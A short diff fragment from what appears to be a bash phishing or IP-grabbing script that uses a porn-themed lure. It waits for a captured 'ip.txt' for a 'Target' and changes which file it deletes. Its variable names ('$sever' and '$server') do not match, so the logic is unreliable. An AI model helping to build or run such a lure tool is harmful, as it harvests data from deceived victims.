@@ -31,7 +31,7 @@ while [ true ]; do
 if [[ -e "site/$sever/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target open Bokep!\n"
 hedygans
-rm -rf ip.txt
+rm -rf site/$server/ip.txt
 
 fi
 
